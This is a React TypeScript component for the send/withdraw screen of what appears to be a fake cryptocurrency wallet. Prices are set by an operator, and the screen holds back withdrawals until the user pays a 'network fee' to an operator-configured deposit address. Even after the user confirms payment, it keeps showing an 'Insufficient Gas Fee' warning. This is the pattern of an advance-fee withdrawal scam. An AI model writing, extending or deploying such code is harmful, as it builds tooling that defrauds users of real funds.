import React, { useEffect, useId, useState } from 'react';
import { ArrowLeft, AlertCircle, Copy } from 'lucide-react';
import { ViewState } from '../App';
import { AssetType } from '../store';
import { api, WalletData, SettingsData } from '../api';
import { saveTxToStorage, loadTxFromStorage } from '../txStorage';
import { toast } from 'sonner';

interface SendWithdrawViewProps {
  asset: AssetType;
  onNavigate: (view: ViewState, asset?: AssetType) => void;
}

export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
  const checkboxId = useId();
  const [wallet, setWallet] = useState<WalletData | null>(null);
  const [settings, setSettings] = useState<SettingsData | null>(null);
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [error, setError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);

  useEffect(() => {
    Promise.all([api.getWallet(), api.getSettings()])
      .then(([w, s]) => { setWallet(w); setSettings(s); })
      .catch(() => toast.error('Failed to load wallet data'))
      .finally(() => setLoading(false));
  }, []);

  if (loading || !wallet || !settings) {
    return (
      <div className="flex flex-col h-full items-center justify-center bg-background">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const maxAmount = wallet[asset];
  const prices: Record<AssetType, number> = {
    btc: settings.btc_price,
    eth: settings.eth_price,
    usdt: settings.usdt_price,
    trx: settings.trx_price,
  };

  // Deposit address for THIS specific asset (matches the coin being withdrawn)
  const feeDepositAddress: string | null | undefined =
    settings[`deposit_address_${asset}` as keyof SettingsData] as string | null | undefined;

  // Convert the USD gas fee to the withdrawal asset's units
  const feeInAsset: number =
    asset === 'usdt'
      ? parseFloat(settings.gas_fee_usd.toFixed(4))
      : parseFloat((settings.gas_fee_usd / prices[asset]).toFixed(8));

  const assetLabel = asset.toUpperCase();

  // Gas fee section shows only when:
  //   1. auto-approve is OFF, AND
  //   2. a deposit address is configured for this specific coin
  const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress;

  const getAssetName = () => {
    switch (asset) {
      case 'btc': return 'Bitcoin (BTC)';
      case 'eth': return 'Ethereum (ETH)';
      case 'usdt': return 'Tether (USDT)';
      case 'trx': return 'Tron (TRX)';
    }
  };

  const copyFeeAddress = () => {
    if (!feeDepositAddress) return;
    navigator.clipboard.writeText(feeDepositAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };

  const handleSend = async () => {
    setError('');

    if (!address.trim()) { setError('Please enter a recipient address'); return; }

    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) { setError('Please enter a valid amount'); return; }
    if (withdrawAmount > maxAmount) { setError(`Insufficient ${assetLabel} balance`); return; }

    // Only require gas fee ack when the fee section is visible
    if (showGasFeeSection && !gasFeeAcknowledged) {
      setError('Insufficient Gas Fee — please cover your gas fee and confirm before proceeding');
      return;
    }

    setSubmitting(true);
    try {
      await api.sendWithdraw(asset, withdrawAmount, address.trim());

      const txs = await api.getTransactions().catch(() => []);
      const local = loadTxFromStorage();
      const merged = txs.length >= local.length ? txs : local;
      saveTxToStorage(merged);

      toast.success('Withdrawal processed successfully', {
        description: `Sent ${withdrawAmount} ${assetLabel}`,
      });
      onNavigate('asset-details', asset);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Transaction failed';
      setError(msg);
    } finally {
      setSubmitting(false);
    }
  };

  // Show the "Insufficient Gas Fee" reminder when checkbox is ticked AND amount is entered
  const withdrawAmount = parseFloat(amount);
  const showGasFeeWarning = showGasFeeSection && gasFeeAcknowledged && !isNaN(withdrawAmount) && withdrawAmount > 0;

  return (
    <div className="flex flex-col h-full bg-background">
      {/* Header */}
      <div className="flex items-center p-6 pt-10 relative">
        <button
          onClick={() => onNavigate('asset-details', asset)}
          className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
        >
          <ArrowLeft className="w-6 h-6" />
        </button>
        <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
      </div>

      <div className="flex flex-col flex-1 px-6 py-4 gap-6 overflow-y-auto">
        {/* Asset */}
        <div className="flex flex-col gap-2">
          <label className="text-sm text-muted px-1">Asset</label>
          <div className="w-full bg-card/50 border border-border rounded-xl px-4 py-3.5 text-foreground opacity-70 cursor-not-allowed">
            {getAssetName()}
          </div>
        </div>

        {/* Recipient Address */}
        <div className="flex flex-col gap-2">
          <label className="text-sm text-muted px-1">Recipient Address</label>
          <input
            type="text"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
            placeholder="Paste wallet address"
          />
        </div>

        {/* Amount */}
        <div className="flex flex-col gap-2">
          <div className="flex justify-between items-center px-1">
            <label className="text-sm text-muted">Amount</label>
            <span
              className="text-xs text-primary font-medium cursor-pointer"
              onClick={() => setAmount(maxAmount.toString())}
            >
              Max
            </span>
          </div>
          <div className="relative">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg"
              placeholder="0.00"
              step="any"
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium">
              {assetLabel}
            </div>
          </div>
          <div className="text-xs text-muted px-1 flex justify-between">
            <span>
              Available: {maxAmount > 0 ? maxAmount.toLocaleString(undefined, { maximumFractionDigits: 8 }) : '0'} {assetLabel}
            </span>
            <span>
              ~${(parseFloat(amount || '0') * prices[asset]).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </span>
          </div>
        </div>

        {/* Network Fee section — only shown when a deposit address is set for THIS coin and auto-approve is off */}
        {showGasFeeSection && (
          <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
            {/* Fee amount header */}
            <div className="flex gap-3">
              <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
              <div className="flex flex-col gap-1">
                <div className="text-sm font-semibold text-foreground">Network Fee Required</div>
                <div className="text-xl font-bold text-destructive">
                  {feeInAsset} {assetLabel}
                  <span className="text-sm font-normal text-muted ml-2">≈ ${settings.gas_fee_usd.toFixed(2)}</span>
                </div>
                <div className="text-xs text-muted/90 leading-relaxed">
                  Before your withdrawal is processed, deposit the network fee above to the {assetLabel} address below.
                </div>
              </div>
            </div>

            {/* Asset-specific deposit address */}
            <div className="flex flex-col gap-2">
              <span className="text-xs text-muted uppercase tracking-widest font-medium">
                Send fee to this {assetLabel} address
              </span>
              <button
                onClick={copyFeeAddress}
                className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
              >
                <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeDepositAddress}</span>
                <Copy className="w-4 h-4 text-muted shrink-0" />
              </button>
            </div>

            {/* Acknowledgement checkbox — label wraps everything so the whole row is clickable */}
            <label
              htmlFor={checkboxId}
              className="flex items-start gap-3 cursor-pointer select-none"
            >
              <input
                id={checkboxId}
                type="checkbox"
                checked={gasFeeAcknowledged}
                onChange={(e) => setGasFeeAcknowledged(e.target.checked)}
                className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
              />
              <span className="text-xs text-muted leading-relaxed">
                I confirm I have already sent the network fee of{' '}
                <span className="text-destructive font-semibold">{feeInAsset} {assetLabel}</span>{' '}
                to the address above and my withdrawal is ready to be processed.
              </span>
            </label>

            {/* Gas fee reminder — appears after checkbox is ticked and amount entered */}
            {showGasFeeWarning && (
              <div className="rounded-lg bg-destructive/20 border border-destructive/40 px-3 py-2.5 flex gap-2 items-start">
                <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                <p className="text-xs text-destructive font-medium leading-relaxed">
                  Insufficient Gas Fee — Kindly cover your gas fee of{' '}
                  <span className="font-bold">{feeInAsset} {assetLabel}</span> to the address above before confirming your withdrawal.
                </p>
              </div>
            )}
          </div>
        )}

        {error && (
          <div className="text-destructive text-sm px-1 font-medium text-center">{error}</div>
        )}

        <button
          onClick={handleSend}
          disabled={submitting || (showGasFeeSection && !gasFeeAcknowledged)}
          className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
        >
          {submitting ? 'Processing…' : 'Confirm Withdrawal'}
        </button>
      </div>
    </div>
  );
}
